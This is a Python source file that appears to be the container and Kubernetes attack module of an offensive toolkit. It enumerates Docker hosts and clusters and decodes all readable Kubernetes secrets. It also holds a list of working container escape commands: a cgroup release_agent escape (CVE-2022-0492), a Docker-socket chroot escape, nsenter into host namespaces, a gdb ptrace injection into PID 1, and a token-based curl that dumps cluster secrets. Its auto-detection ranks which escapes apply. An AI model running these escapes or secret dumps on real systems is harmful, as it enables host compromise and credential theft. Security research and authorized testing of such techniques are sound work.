"""Container and Kubernetes attack module.

Provides enumeration, exploitation, privilege escalation, and escape
techniques for containerized environments and Kubernetes clusters.

Supports Docker, containerd, CRI-O runtimes and Kubernetes API interaction.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any, Optional


@dataclass
class ContainerResource:
    """A discovered container or cluster resource."""

    resource_type: str
    identifier: str
    namespace: str = ""
    details: dict[str, Any] = field(default_factory=dict)


@dataclass
class ContainerFinding:
    """A security finding in a container environment."""

    resource: ContainerResource
    severity: str
    title: str
    description: str
    mitre_technique: str = ""
    exploitation: str = ""


class DockerEnumerator:
    """Enumerate Docker host and containers."""

    def __init__(self, socket_path: str = "/var/run/docker.sock") -> None:
        self.socket_path = socket_path

    def is_socket_accessible(self) -> bool:
        """Check if the Docker socket is readable/writable."""
        return os.path.exists(self.socket_path) and os.access(self.socket_path, os.R_OK | os.W_OK)

    def _docker_api(self, endpoint: str) -> Optional[dict]:
        """Make a raw HTTP request to the Docker Unix socket."""
        import http.client
        import socket

        conn = http.client.HTTPConnection("localhost")
        conn.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            conn.sock.connect(self.socket_path)
            conn.request("GET", endpoint)
            resp = conn.getresponse()
            if resp.status == 200:
                return json.loads(resp.read().decode())
        except Exception:
            return None
        finally:
            conn.sock.close()
        return None

    def list_containers(self) -> list[dict[str, Any]]:
        """List all containers with extended information."""
        if not self.is_socket_accessible():
            try:
                result = subprocess.run(
                    ["docker", "ps", "--format", "{{json .}}"],
                    capture_output=True, text=True, timeout=10,
                )
                containers: list[dict[str, Any]] = []
                for line in result.stdout.strip().split("\n"):
                    if line:
                        try:
                            containers.append(json.loads(line))
                        except json.JSONDecodeError:
                            pass
                return containers
            except (FileNotFoundError, subprocess.TimeoutExpired):
                return []

        data = self._docker_api("/containers/json?all=true")
        return data if isinstance(data, list) else []

    def list_images(self) -> list[dict[str, Any]]:
        """List all Docker images."""
        if not self.is_socket_accessible():
            try:
                result = subprocess.run(
                    ["docker", "images", "--format", "{{json .}}"],
                    capture_output=True, text=True, timeout=10,
                )
                images: list[dict[str, Any]] = []
                for line in result.stdout.strip().split("\n"):
                    if line:
                        try:
                            images.append(json.loads(line))
                        except json.JSONDecodeError:
                            pass
                return images
            except (FileNotFoundError, subprocess.TimeoutExpired):
                return []

        data = self._docker_api("/images/json")
        return data if isinstance(data, list) else []

    def inspect_container(self, container_id: str) -> Optional[dict[str, Any]]:
        """Get detailed configuration of a container (privileged, mounts, capabilities)."""
        if not self.is_socket_accessible():
            try:
                result = subprocess.run(
                    ["docker", "inspect", container_id],
                    capture_output=True, text=True, timeout=10,
                )
                if result.returncode == 0:
                    return json.loads(result.stdout)[0]
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass
            return None

        data = self._docker_api(f"/containers/{container_id}/json")
        return data

    def check_privileged_containers(self) -> list[dict[str, Any]]:
        """Find containers running with --privileged flag."""
        containers = self.list_containers()
        privileged: list[dict[str, Any]] = []
        for container in containers:
            cid = container.get("Id", container.get("ID", ""))
            details = self.inspect_container(cid)
            if details:
                host_config = details.get("HostConfig", {})
                if host_config.get("Privileged", False):
                    privileged.append({
                        "id": cid[:12],
                        "name": details.get("Name", ""),
                        "image": details.get("Config", {}).get("Image", ""),
                        "privileged": True,
                        "capabilities": host_config.get("CapAdd", []),
                        "host_pid": host_config.get("PidMode", ""),
                        "mounts": [
                            m.get("Source", "") + ":" + m.get("Destination", "")
                            for m in details.get("Mounts", [])
                        ],
                    })
        return privileged

    def check_sensitive_mounts(self) -> list[dict[str, Any]]:
        """Find containers with sensitive host path mounts."""
        sensitive_paths = [
            "/", "/root", "/home", "/etc", "/var/run", "/proc",
            "/sys", "/dev", "/var/log", "/opt", "/usr/bin",
        ]
        containers = self.list_containers()
        findings: list[dict[str, Any]] = []
        for container in containers:
            cid = container.get("Id", container.get("ID", ""))
            details = self.inspect_container(cid)
            if details:
                for mount in details.get("Mounts", []):
                    if any(mount.get("Source", "").startswith(sp) for sp in sensitive_paths):
                        findings.append({
                            "container_id": cid[:12],
                            "container_name": details.get("Name", ""),
                            "mount_source": mount.get("Source", ""),
                            "mount_dest": mount.get("Destination", ""),
                            "mode": mount.get("Mode", ""),
                        })
        return findings

    def check_docker_socket_mount(self) -> list[dict[str, Any]]:
        """Find containers with the Docker socket mounted (escape vector)."""
        containers = self.list_containers()
        findings: list[dict[str, Any]] = []
        for container in containers:
            cid = container.get("Id", container.get("ID", ""))
            details = self.inspect_container(cid)
            if details:
                for mount in details.get("Mounts", []):
                    if "docker.sock" in mount.get("Source", ""):
                        findings.append({
                            "container_id": cid[:12],
                            "container_name": details.get("Name", ""),
                            "docker_socket_mounted": True,
                            "escape_possible": True,
                            "technique": "docker run -v /:/host --privileged --pid=host alpine chroot /host",
                        })
        return findings

    def check_capabilities(self) -> list[dict[str, Any]]:
        """Find containers with dangerous Linux capabilities."""
        dangerous_caps = {
            "SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_READ_SEARCH",
            "DAC_OVERRIDE", "NET_ADMIN", "NET_RAW", "IPC_LOCK",
            "SYS_RAWIO", "SYS_BOOT", "SYSLOG",
        }
        containers = self.list_containers()
        findings: list[dict[str, Any]] = []
        for container in containers:
            cid = container.get("Id", container.get("ID", ""))
            details = self.inspect_container(cid)
            if details:
                caps = set(details.get("HostConfig", {}).get("CapAdd", []))
                dangerous = caps & dangerous_caps
                if dangerous:
                    findings.append({
                        "container_id": cid[:12],
                        "container_name": details.get("Name", ""),
                        "dangerous_capabilities": sorted(dangerous),
                    })
        return findings

    def full_check(self) -> dict[str, Any]:
        """Execute all Docker security checks and return aggregated results."""
        return {
            "docker_socket_accessible": self.is_socket_accessible(),
            "containers_count": len(self.list_containers()),
            "images_count": len(self.list_images()),
            "privileged_containers": self.check_privileged_containers(),
            "sensitive_mounts": self.check_sensitive_mounts(),
            "docker_socket_mounts": self.check_docker_socket_mount(),
            "dangerous_capabilities": self.check_capabilities(),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        }


class K8sEnumerator:
    """Enumerate Kubernetes clusters via API or kubeconfig."""

    def __init__(self, kubeconfig: str = "", token: str = "", api_server: str = "") -> None:
        self.kubeconfig = kubeconfig or os.environ.get("KUBECONFIG", os.path.expanduser("~/.kube/config"))
        self.token = token
        self.api_server = api_server
        self._session: Any = None
        self._verify_ssl = False

    def _load_kubeconfig(self) -> Optional[dict[str, Any]]:
        if os.path.exists(self.kubeconfig):
            try:
                import yaml
                with open(self.kubeconfig) as f:
                    return yaml.safe_load(f)
            except Exception:
                pass
        return None

    def _get_k8s_api(self, path: str) -> Optional[dict[str, Any]]:
        if self.api_server and self.token:
            if not HAS_REQUESTS:
                return None
            try:
                import requests
                resp = requests.get(
                    f"{self.api_server}{path}",
                    headers={"Authorization": f"Bearer {self.token}"},
                    verify=self._verify_ssl,
                    timeout=10,
                )
                if resp.status_code == 200:
                    return resp.json()
            except Exception:
                pass
            return None

        kc = self._load_kubeconfig()
        if not kc:
            try:
                result = subprocess.run(
                    ["kubectl", "get", path.lstrip("/").replace("/", " "), "-o", "json"],
                    capture_output=True, text=True, timeout=10,
                )
                if result.returncode == 0:
                    return json.loads(result.stdout)
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass
            return None

        try:
            clusters = kc.get("clusters", [])
            if not clusters:
                return None
            server = clusters[0].get("cluster", {}).get("server", "")
            ca = clusters[0].get("cluster", {}).get("certificate-authority-data", "")

            if not server:
                return None

            import base64
            import tempfile
            import requests

            verify = True
            ca_file = None
            if ca:
                ca_file = tempfile.NamedTemporaryFile(delete=False, suffix=".crt")
                ca_file.write(base64.b64decode(ca))
                ca_file.flush()
                verify = ca_file.name

            auth_header = ""
            users = kc.get("users", [])
            if users:
                user = users[0].get("user", {})
                token = user.get("token", "")
                if not token and user.get("client-certificate-data"):
                    pass
                auth_header = f"Bearer {token}"

            resp = requests.get(
                f"{server}{path}",
                headers={"Authorization": auth_header},
                verify=verify,
                timeout=10,
            )
            if ca_file:
                os.unlink(ca_file.name)
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass

        return None

    def list_pods(self, namespace: str = "") -> list[dict[str, Any]]:
        """List pods in all namespaces or a specific namespace."""
        api_path = f"/api/v1/namespaces/{namespace}/pods" if namespace else "/api/v1/pods"

        try:
            result = subprocess.run(
                ["kubectl", "get", "pods", "--all-namespaces" if not namespace else f"-n={namespace}", "-o", "json"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                data = json.loads(result.stdout)
                return data.get("items", [])
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        data = self._get_k8s_api(api_path)
        if data:
            if namespace:
                return data.get("items", [])
            return data.get("items", [])
        return []

    def list_namespaces(self) -> list[str]:
        """List all namespaces."""
        try:
            result = subprocess.run(
                ["kubectl", "get", "namespaces", "-o", "json"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                data = json.loads(result.stdout)
                return [ns["metadata"]["name"] for ns in data.get("items", [])]
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        data = self._get_k8s_api("/api/v1/namespaces")
        if data:
            return [ns["metadata"]["name"] for ns in data.get("items", [])]
        return []

    def list_secrets(self, namespace: str = "") -> list[dict[str, Any]]:
        """List secrets (without decoding values by default)."""
        api_path = f"/api/v1/namespaces/{namespace}/secrets" if namespace else "/api/v1/secrets"

        try:
            result = subprocess.run(
                ["kubectl", "get", "secrets", "--all-namespaces" if not namespace else f"-n={namespace}", "-o", "json"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                data = json.loads(result.stdout)
                secrets: list[dict[str, Any]] = []
                for secret in data.get("items", []):
                    decoded = {}
                    if "data" in secret:
                        import base64
                        for key, value in secret["data"].items():
                            try:
                                decoded[key] = base64.b64decode(value).decode()
                            except Exception:
                                decoded[key] = "[binary]"
                    secrets.append({
                        "name": secret["metadata"]["name"],
                        "namespace": secret["metadata"]["namespace"],
                        "type": secret.get("type", ""),
                        "data_keys": list(secret.get("data", {}).keys()),
                        "decoded": decoded,
                    })
                return secrets
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        data = self._get_k8s_api(api_path)
        if data:
            secrets: list[dict[str, Any]] = []
            for secret in data.get("items", []):
                secrets.append({
                    "name": secret["metadata"]["name"],
                    "namespace": secret["metadata"]["namespace"],
                    "type": secret.get("type", ""),
                    "data_keys": list(secret.get("data", {}).keys()),
                })
            return secrets
        return []

    def list_service_accounts(self, namespace: str = "") -> list[dict[str, Any]]:
        """List service accounts and their attached roles."""
        api_path = f"/api/v1/namespaces/{namespace}/serviceaccounts" if namespace else "/api/v1/serviceaccounts"

        try:
            result = subprocess.run(
                ["kubectl", "get", "sa", "--all-namespaces" if not namespace else f"-n={namespace}", "-o", "json"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                data = json.loads(result.stdout)
                return [{
                    "name": sa["metadata"]["name"],
                    "namespace": sa["metadata"]["namespace"],
                    "secrets": [s["name"] for s in sa.get("secrets", [])],
                } for sa in data.get("items", [])]
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        data = self._get_k8s_api(api_path)
        if data:
            return [{
                "name": sa["metadata"]["name"],
                "namespace": sa["metadata"]["namespace"],
                "secrets": [s["name"] for s in sa.get("secrets", [])],
            } for sa in data.get("items", [])]
        return []

    def check_rbac(self) -> dict[str, Any]:
        """Check current user's RBAC permissions."""
        rules: list[dict[str, Any]] = []
        try:
            result = subprocess.run(
                ["kubectl", "auth", "can-i", "--list"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                for line in result.stdout.strip().split("\n"):
                    parts = line.split()
                    if len(parts) >= 2:
                        rules.append({"verb": parts[0], "resource": parts[1:]})
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        cluster_admin = False
        for rule in rules:
            if rule["verb"] == "*" and "*" in " ".join(rule["resource"]):
                cluster_admin = True

        return {
            "can_list_secrets": any("secrets" in " ".join(r["resource"]) and r["verb"] in ("get", "list", "*") for r in rules),
            "can_create_pods": any("pods" in " ".join(r["resource"]) and r["verb"] in ("create", "*") for r in rules),
            "cluster_admin": cluster_admin,
            "raw_rules": rules,
        }

    def check_pod_escape_vectors(self) -> list[ContainerFinding]:
        """Check for pod escape vectors in the current pod."""
        findings: list[ContainerFinding] = []
        host_pid = os.path.exists("/proc/1/root") and os.path.samefile("/proc/1/root", "/")
        if host_pid:
            findings.append(ContainerFinding(
                resource=ContainerResource("pod", "current"),
                severity="HIGH",
                title="Host PID namespace accessible",
                description="The container shares the host PID namespace. Process injection into host processes is possible.",
                mitre_technique="T1611",
                exploitation="nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
            ))

        if os.path.exists("/var/run/docker.sock"):
            findings.append(ContainerFinding(
                resource=ContainerResource("pod", "current"),
                severity="CRITICAL",
                title="Docker socket mounted",
                description="The Docker socket is accessible. Full host compromise via container escape.",
                mitre_technique="T1610",
                exploitation="docker run -v /:/host -it alpine chroot /host",
            ))

        if os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token"):
            try:
                with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
                    token = f.read().strip()
                findings.append(ContainerFinding(
                    resource=ContainerResource("pod", "current"),
                    severity="MEDIUM",
                    title="Service account token found",
                    description=f"K8s service account token is mounted. Token: {token[:20]}...",
                    mitre_technique="T1528",
                    exploitation="kubectl --token=$TOKEN --server=https://kubernetes.default get secrets --all-namespaces",
                ))
            except Exception:
                pass

        dangerous_mounts = ["/var/log", "/proc", "/sys", "/"]
        for path in dangerous_mounts:
            if os.path.ismount(path):
                pass

        return findings

    def full_check(self, sessions_dir: str = "sessions") -> dict[str, Any]:
        """Execute all Kubernetes security checks."""
        results: dict[str, Any] = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "namespaces": self.list_namespaces(),
            "pods_total": len(self.list_pods()),
            "secrets": [],
            "service_accounts": [],
            "rbac": {},
            "escape_vectors": [],
        }

        namespaces = results["namespaces"][:20]
        if not namespaces:
            namespaces = [""]

        for ns in namespaces:
            secrets = self.list_secrets(ns)
            results["secrets"].extend(secrets)
            results["service_accounts"].extend(self.list_service_accounts(ns))

        results["rbac"] = self.check_rbac()
        results["escape_vectors"] = [
            {
                "resource_type": f.resource.resource_type,
                "severity": f.severity,
                "title": f.title,
                "description": f.description,
                "mitre_technique": f.mitre_technique,
                "exploitation": f.exploitation,
            }
            for f in self.check_pod_escape_vectors()
        ]

        os.makedirs(sessions_dir, exist_ok=True)
        out_path = os.path.join(sessions_dir, "k8s_scan.json")
        with open(out_path, "w") as f:
            json.dump(results, f, indent=2, default=str)

        return results


class ContainerEscapeTechniques:
    """Collection of container escape techniques and detection."""

    ESCAPE_TECHNIQUES = [
        {
            "name": "privileged_container_host_mount",
            "description": "Mount host filesystem from privileged container",
            "command": "mount /dev/sda1 /mnt && chroot /mnt",
            "mitre": "T1610",
            "requires": ["privileged"],
        },
        {
            "name": "docker_socket_escape",
            "description": "Use mounted Docker socket to run privileged container",
            "command": "docker run -v /:/host -it --privileged --pid=host alpine chroot /host",
            "mitre": "T1610",
            "requires": ["docker_socket"],
        },
        {
            "name": "cgroup_release_agent",
            "description": "Escape via cgroup release_agent (CVE-2022-0492)",
            "command": (
                "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && "
                "mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
                "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && "
                "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && "
                "echo '#!/bin/sh' > /cmd && echo \"id > $host_path/output\" >> /cmd && "
                "chmod +x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
            ),
            "mitre": "T1611",
            "requires": ["SYS_ADMIN"],
        },
        {
            "name": "cap_sys_ptrace",
            "description": "Inject code into host process via ptrace (SYS_PTRACE cap)",
            "command": "gdb -p 1 -batch -ex 'call (void)system(\"id >> /tmp/pwned\")'",
            "mitre": "T1055",
            "requires": ["SYS_PTRACE"],
        },
        {
            "name": "nsenter_host",
            "description": "nsenter into host namespaces when --pid=host",
            "command": "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
            "mitre": "T1611",
            "requires": ["host_pid"],
        },
        {
            "name": "k8s_service_account_token_abuse",
            "description": "Use mounted service account token to access K8s API",
            "command": (
                "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
                "APISERVER=https://kubernetes.default && "
                "curl -sk -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/secrets"
            ),
            "mitre": "T1528",
            "requires": ["k8s_sa_token"],
        },
    ]

    @staticmethod
    def detect_current_environment() -> dict[str, Any]:
        """Detect if running inside a container and identify escape opportunities."""
        in_container = False
        privileged = False
        docker_socket = False
        caps: list[str] = []
        host_pid = False
        k8s = False

        if os.path.exists("/.dockerenv"):
            in_container = True

        try:
            with open("/proc/1/cgroup") as f:
                cgroup = f.read()
            if "docker" in cgroup or "kubepods" in cgroup or "containerd" in cgroup:
                in_container = True
            if "kubepods" in cgroup:
                k8s = True
        except Exception:
            pass

        if os.path.exists("/var/run/docker.sock"):
            docker_socket = True

        try:
            result = subprocess.run(["capsh", "--print"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split("\n"):
                if "=" in line and "cap_" in line.lower():
                    caps.append(line.strip())
        except Exception:
            pass

        try:
            if os.path.exists("/proc/1/ns/pid"):
                host_pid_stat = os.stat("/proc/1/ns/pid")
                self_pid_stat = os.stat("/proc/self/ns/pid")
                host_pid = host_pid_stat.st_ino != self_pid_stat.st_ino
        except Exception:
            pass

        if os.path.exists("/dev"):
            try:
                result = subprocess.run(
                    ["sh", "-c", "cat /proc/self/status | grep -i seccomp"],
                    capture_output=True, text=True, timeout=2,
                )
                if "0" in result.stdout:
                    privileged = True
            except Exception:
                pass

        if os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token"):
            k8s = True

        return {
            "in_container": in_container,
            "is_kubernetes": k8s,
            "privileged": privileged,
            "docker_socket_accessible": docker_socket,
            "host_pid_namespace": host_pid,
            "capabilities": caps,
        }


try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class ContainerRuntimeDetector:
    """Auto-detect container runtime and available escape primitives.

    Supports: Docker, containerd, CRI-O, Podman, LXC/LXD, systemd-nspawn.
    """

    RUNTIME_SIGNATURES = {
        "docker": {
            "files": ["/.dockerenv", "/var/run/docker.sock"],
            "cgroup": "docker",
            "env_var": ("container", "docker"),
        },
        "containerd": {
            "files": ["/run/containerd/containerd.sock"],
            "cgroup": "containerd",
            "mounts": ["/run/containerd"],
        },
        "crio": {
            "files": ["/var/run/crio/crio.sock"],
            "cgroup": "crio",
            "mounts": ["/var/run/crio"],
        },
        "podman": {
            "files": ["/run/podman/podman.sock", "/run/user/*/podman/podman.sock"],
            "cgroup": "libpod",
            "processes": ["podman", "conmon"],
        },
        "lxc": {
            "files": ["/dev/lxd/sock"],
            "cgroup": "lxc",
            "env_var": ("container", "lxc"),
        },
        "kubernetes": {
            "files": ["/var/run/secrets/kubernetes.io/serviceaccount/token"],
            "cgroup": "kubepods",
            "mounts": ["/var/run/secrets/kubernetes.io"],
        },
        "systemd_nspawn": {
            "cgroup": "nspawn",
            "env_var": ("container", "systemd-nspawn"),
        },
    }

    @staticmethod
    def detect_runtime() -> dict[str, Any]:
        """Detect container runtime from multiple indicators.

        Returns:
            Dict with runtime info including name, confidence, and indicators.
        """
        scores: dict[str, int] = {}
        indicators: dict[str, list[str]] = {}

        for runtime, sigs in ContainerRuntimeDetector.RUNTIME_SIGNATURES.items():
            scores[runtime] = 0
            indicators[runtime] = []

            for file_pattern in sigs.get("files", []):
                import glob
                matches = glob.glob(file_pattern)
                if matches:
                    scores[runtime] += 2
                    indicators[runtime].append(f"file:{matches[0]}")

            try:
                with open("/proc/1/cgroup") as f:
                    cgroup_data = f.read()
                if sigs.get("cgroup", "").lower() in cgroup_data.lower():
                    scores[runtime] += 3
                    indicators[runtime].append(f"cgroup:{sigs['cgroup']}")
            except Exception:
                pass

            for mount_hint in sigs.get("mounts", []):
                try:
                    with open("/proc/mounts") as f:
                        mounts = f.read()
                    if mount_hint in mounts:
                        scores[runtime] += 1
                        indicators[runtime].append(f"mount:{mount_hint}")
                except Exception:
                    pass

            for env_var_value in sigs.get("env_var", []):
                env_val = os.environ.get(env_var_value[0], "")
                if env_var_value[1] in env_val.lower():
                    scores[runtime] += 1
                    indicators[runtime].append(f"env:{env_var_value[0]}={env_val[:50]}")

            for proc_hint in sigs.get("processes", []):
                try:
                    result = subprocess.run(
                        ["pgrep", "-f", proc_hint],
                        capture_output=True, text=True, timeout=3,
                    )
                    if result.stdout.strip():
                        scores[runtime] += 1
                        indicators[runtime].append(f"process:{proc_hint}")
                except Exception:
                    pass

        ranked = sorted(scores.items(), key=lambda x: x[1], reverse=True)
        best_runtime, best_score = ranked[0]

        return {
            "runtime": best_runtime if best_score > 0 else "unknown",
            "confidence": "high" if best_score >= 5 else ("medium" if best_score >= 2 else "low"),
            "indicators": indicators.get(best_runtime, []),
            "all_scores": {k: v for k, v in ranked if v > 0},
        }

    @staticmethod
    def detect_mounts() -> dict[str, list[str]]:
        """Detect dangerous mounts in the current container.

        Returns:
            Dict with categories of dangerous mounts found.
        """
        dangerous: dict[str, list[str]] = {
            "host_filesystem": [],
            "docker_socket": [],
            "proc_sys": [],
            "host_root": [],
            "ssh_keys": [],
            "cloud_credentials": [],
            "k8s_credentials": [],
        }

        try:
            with open("/proc/mounts") as f:
                mounts = f.read()
        except Exception:
            return dangerous

        for line in mounts.splitlines():
            parts = line.split()
            if len(parts) < 2:
                continue
            src, dst = parts[0], parts[1]

            if "docker.sock" in src or "containerd.sock" in src or "crio.sock" in src:
                dangerous["docker_socket"].append(f"{src} -> {dst}")
            elif src in ("/", "/host", "/host-root"):
                dangerous["host_root"].append(f"{src} -> {dst}")
            elif any(h in src.lower() for h in ("/root", "/home", "/etc", "/var/log", "/opt")):
                dangerous["host_filesystem"].append(f"{src} -> {dst}")
            elif "/proc" in src and src != "/proc":
                dangerous["proc_sys"].append(f"{src} -> {dst}")
            elif "authorized_keys" in src or "id_rsa" in src:
                dangerous["ssh_keys"].append(f"{src} -> {dst}")
            elif any(c in src.lower() for c in (".aws", ".config/gcloud", ".azure")):
                dangerous["cloud_credentials"].append(f"{src} -> {dst}")
            elif any(comp in ("kubernetes.io", "serviceaccount") for comp in src.split("/")):
                dangerous["k8s_credentials"].append(f"{src} -> {dst}")

        dangerous = {k: v for k, v in dangerous.items() if v}
        return dangerous

    @staticmethod
    def detect_dangerous_capabilities() -> list[str]:
        """Detect dangerous Linux capabilities in the current container.

        Returns:
            List of dangerous capabilities found.
        """
        dangerous_caps = {
            "CAP_SYS_ADMIN": "Mount, pivot_root, nsenter, cgroup release_agent escape",
            "CAP_SYS_PTRACE": "ptrace inject into host process",
            "CAP_SYS_MODULE": "Load kernel modules for privesc",
            "CAP_SYS_RAWIO": "Direct hardware access, kernel memory read/write",
            "CAP_SYS_BOOT": "Reboot the system",
            "CAP_NET_ADMIN": "Network stack manipulation, ARP spoofing",
            "CAP_NET_RAW": "Raw socket creation for packet injection",
            "CAP_DAC_READ_SEARCH": "Read any file bypassing permissions",
            "CAP_DAC_OVERRIDE": "Bypass file permission checks",
            "CAP_SYS_CHROOT": "chroot into host filesystem if mounted",
            "CAP_SYSLOG": "Read kernel message buffer for cred leaks",
            "CAP_FSETID": "Set SUID/SGID bits on arbitrary files",
        }

        found: list[str] = []
        try:
            result = subprocess.run(
                ["capsh", "--print"], capture_output=True, text=True, timeout=5,
            )
            current_caps = set()
            for line in result.stdout.splitlines():
                if "cap_" in line.lower():
                    cap_name = "CAP_" + line.split("cap_")[-1].split(",")[0].split("=")[0].upper()
                    current_caps.add(cap_name)

            for cap_name, desc in dangerous_caps.items():
                if cap_name in current_caps:
                    found.append(f"{cap_name} ({desc})")
        except Exception:
            try:
                result = subprocess.run(
                    ["cat", "/proc/self/status"], capture_output=True, text=True, timeout=2,
                )
                for line in result.stdout.splitlines():
                    if "CapEff:" in line:
                        cap_hex = line.split(":")[1].strip()
                        cap_int = int(cap_hex, 16)
                        bit_index: dict[str, int] = {
                            "CAP_SYS_ADMIN": 21, "CAP_SYS_PTRACE": 19,
                            "CAP_DAC_READ_SEARCH": 2, "CAP_DAC_OVERRIDE": 1,
                            "CAP_NET_ADMIN": 12, "CAP_NET_RAW": 13,
                            "CAP_SYS_CHROOT": 18, "CAP_SYSLOG": 34,
                            "CAP_SYS_MODULE": 16, "CAP_SYS_RAWIO": 17,
                        }
                        for cap_name, bit in bit_index.items():
                            if cap_int & (1 << bit):
                                found.append(f"{cap_name} ({dangerous_caps.get(cap_name, '')})")
                        break
            except Exception:
                pass
        return found

    @staticmethod
    def auto_detect_all() -> dict[str, Any]:
        """Run comprehensive container escape auto-detection.

        Combines runtime detection, environment detection, mount analysis,
        and capability enumeration into a single report.

        Returns:
            Comprehensive assessment dict.
        """
        runtime = ContainerRuntimeDetector.detect_runtime()
        env = ContainerEscapeTechniques.detect_current_environment()
        mounts = ContainerRuntimeDetector.detect_mounts()
        caps = ContainerRuntimeDetector.detect_dangerous_capabilities()

        applicable_techniques = []
        for tech in ContainerEscapeTechniques.ESCAPE_TECHNIQUES:
            requires = set(tech.get("requires", []))
            satisfied = True
            for req in requires:
                if req == "privileged" and not env.get("privileged"):
                    satisfied = False
                elif req == "docker_socket" and not env.get("docker_socket_accessible"):
                    satisfied = False
                elif req == "SYS_ADMIN" and not any("SYS_ADMIN" in c for c in caps):
                    satisfied = False
                elif req == "SYS_PTRACE" and not any("SYS_PTRACE" in c for c in caps):
                    satisfied = False
                elif req == "host_pid" and not env.get("host_pid_namespace"):
                    satisfied = False
                elif req == "k8s_sa_token" and not env.get("is_kubernetes"):
                    satisfied = False
            if satisfied:
                applicable_techniques.append(tech)

        escape_possible = len(applicable_techniques) > 0
        score = len(applicable_techniques) * 20
        if env.get("privileged"):
            score = 100
        elif mounts.get("docker_socket"):
            score = 90
        elif any("SYS_ADMIN" in c for c in caps):
            score = max(score, 85)
        elif mounts.get("host_filesystem"):
            score = max(score, 60)

        return {
            "runtime": runtime,
            "environment": env,
            "dangerous_mounts": mounts,
            "dangerous_capabilities": caps,
            "applicable_techniques": applicable_techniques,
            "escape_possible": escape_possible,
            "escape_score": min(score, 100),
            "assessment_summary": (
                "CRITICAL: Immediate escape possible" if score >= 90
                else "HIGH: Multiple escape vectors detected" if score >= 70
                else "MEDIUM: Potential escape vectors found" if score >= 30
                else "LOW: Limited escape opportunities detected" if score > 0
                else "NONE: No obvious escape vectors found"
            ),
        }


__all__ = [
    "DockerEnumerator",
    "K8sEnumerator",
    "ContainerEscapeTechniques",
    "ContainerRuntimeDetector",
    "ContainerResource",
    "ContainerFinding",
]
